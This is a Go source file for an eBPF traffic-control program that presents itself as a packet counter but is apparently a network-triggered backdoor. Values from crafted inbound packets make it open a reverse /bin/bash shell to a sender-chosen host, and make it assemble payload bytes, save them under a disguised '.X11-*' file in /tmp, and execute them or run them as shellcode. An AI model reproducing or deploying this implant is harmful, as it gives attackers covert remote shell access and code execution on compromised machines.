package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"time"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
)

//go:generate go tool bpf2go -tags linux traffic_test ebpf/traffic-test.c

type Data struct {
	host     net.IP
	port     uint32
	data     []byte
	done     bool
	save     bool
	filename string
	exec     bool
}

var conns map[string]bool = make(map[string]bool)

var datas map[string]Data = make(map[string]Data)

func displayCounter(objs traffic_testObjects) {
	var count traffic_testTrafficOperation
	err := objs.TrafficOps.Lookup(uint32(0), &count)
	if err != nil {
		log.Fatal("(count) Map lookup:", err)
	}
	log.Printf("Received %d packets", count.Offset)
}

func int2ip(nn uint32) net.IP {
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, nn)
	return ip
}

func getRevshell(objs traffic_testObjects) {
	var rev traffic_testTrafficOperation
	err := objs.TrafficOps.Lookup(uint32(1), &rev)
	if err != nil {
		log.Fatal("(revshell) Map lookup:", err)
	}
	if rev.Host != 0 && rev.Port != 0 {
		host := int2ip(rev.Host)
		connstr := host.String() + ":" + fmt.Sprintf("%d", rev.Port)
		if conns[connstr] {
			return
		}
		conns[connstr] = true
		fmt.Println("Spawning revshell to " + connstr)
		go func() {
			c, _ := net.Dial("tcp", connstr)
			cmd := exec.Command("/bin/bash")
			cmd.Stdin = c
			cmd.Stdout = c
			cmd.Stderr = c
			err := cmd.Run()
			if err != nil {
				fmt.Printf("[ERROR] Fail in revshell for '%s': %s\n", connstr, err)
			}
			conns[connstr] = false
		}()
	}
}

func parseDataAttrs(data Data) Data {
	switch data.port {
	case 1:
		data.done = true
	case 2:
		data.exec = true
	case 3:
		data.save = true
	}
	return data
}

func getData(objs traffic_testObjects) {
	var data_obj traffic_testTrafficOperation
	var data Data
	err := objs.TrafficOps.Lookup(uint32(2), &data_obj)
	if err != nil {
		log.Fatal("(revshell) Map lookup:", err)
	}

	if data_obj.Data != 0 {
		if data_obj.Offset == 0 {
			data_bytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(data_bytes, data_obj.Data)
			data = Data{
				host:     int2ip(data_obj.Host),
				port:     data_obj.Port,
				data:     data_bytes,
				done:     false,
				save:     false,
				filename: "",
				exec:     false,
			}
			fmt.Println("Got new data packet from: " + data.host.String())
			data = parseDataAttrs(data)
			datas[data.host.String()] = data
		} else if data_obj.Offset > 0 {
			host := int2ip(data_obj.Host).String()
			if data, exists := datas[host]; exists {
				fmt.Println("Got existing data packet from: " + host)
				data.port = data_obj.Port
				data_bytes := make([]byte, 4)
				binary.LittleEndian.PutUint32(data_bytes, data_obj.Data)
				data.data = append(data.data, data_bytes...)
				data = parseDataAttrs(data)
			}
		}

		if data.done {
			if data.save {
				fp, err := os.CreateTemp("/tmp", ".X11-*")
				if err != nil {
					log.Fatalf("[DATA] exec+save: %s", err)
				}
				fp.Write(data.data)
				fp.Close()

				fmt.Printf("[SAVE] Data from '%s' saved to '%s'\n", data.host.String(), fp.Name())

				if data.exec {
					command := "/bin/sh -c '" + fp.Name() + "'"
					fmt.Printf("[SAVE] Executing \"%s\"\n", command)
					go func() {
						cmd := exec.Command(command)
						err := cmd.Run()
						if err != nil {
							fmt.Printf("[ERROR] Fail in DATA save+exec for '%s': %s\n", data.host.String(), err)
						}
					}()
				}

			} else if data.exec {
				execShellcode(data.data)
			}
		}
	}
}

func main() {
	if len(os.Args) < 2 {
		log.Fatalf("Please specify a network interface")
	}

	// Look up the network interface by name.
	ifaceName := os.Args[1]
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("lookup network iface %q: %s", ifaceName, err)
	}

	// Load pre-compiled programs into the kernel.
	objs := traffic_testObjects{}
	if err := loadTraffic_testObjects(&objs, nil); err != nil {
		log.Fatalf("loading objects: %s", err)
	}
	defer objs.Close()

	// Attach the program to Ingress TC.
	l, err := link.AttachTCX(link.TCXOptions{
		Interface: iface.Index,
		Program:   objs.ClassifierIngress,
		Attach:    ebpf.AttachTCXIngress,
	})
	if err != nil {
		log.Fatalf("could not attach TCx program: %s", err)
	}
	defer l.Close()

	log.Printf("Counting incoming packets on %s..", ifaceName)

	// Periodically fetch the packet counter from PktCount,
	// exit the program when interrupted.
	tick := time.Tick(time.Second)
	stop := make(chan os.Signal, 5)
	signal.Notify(stop, os.Interrupt)
	for {
		select {
		case <-tick:
			displayCounter(objs)
			getRevshell(objs)
			getData(objs)
		case <-stop:
			log.Print("Received signal, exiting..")
			return
		}
	}
}
